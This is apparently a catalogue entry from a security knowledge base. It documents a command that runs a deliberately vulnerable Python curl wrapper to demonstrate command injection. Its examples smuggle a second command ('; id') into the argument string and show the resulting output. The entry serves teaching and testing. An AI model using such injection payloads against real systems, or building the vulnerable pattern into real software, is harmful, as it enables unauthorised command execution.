---
id: 6517b030-5a27-4b00-8e68-1cb2adc4216c
name: execute-vulnerable-curl-script
type: command
executor: bash
data: python $_SCRIPT_PATH "$_ARG_STRING"
output: null
created_at: '2023-04-06T03:55:54.012204+00:00'
updated_at: '2023-04-06T03:55:54.027705+00:00'
platforms:
  - Linux
  - Unix
tags:
  - injection
  - python
  - rce
verified: true
validated: true
---

# execute-vulnerable-curl-script

## Command

```bash
python $_SCRIPT_PATH "$_ARG_STRING"
```

## Description

This command invokes a vulnerable Python script that parses the provided argument string and executes a curl command with it. Used to demonstrate command injection by supplying malicious $_ARG_STRING.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_SCRIPT_PATH | Path to the vulnerable Python script (e.g., vulnerable_curl.py) | Yes |
| $_ARG_STRING | The input string to split and append to curl (e.g., "https://example.com ; id") | Yes |

## Examples

### Basic Usage

```bash
python vulnerable_curl.py "https://www.google.fr -o test.html"
```

### Advanced Usage (Injection)

```bash
python vulnerable_curl.py "https://www.google.fr -o test.html ; id"
```

## Expected Output

Prints the parsed command list, then executes it. For injection, additional output from the injected command (e.g., 'uid=1000(user) gid=1000(user)' from 'id'). Curl output or errors if applicable.

## Related

- [[procedures/Command-Injection-via-Curl-Arguments]]
- [[codes/Vulnerable-Curl-Executor-Script]]
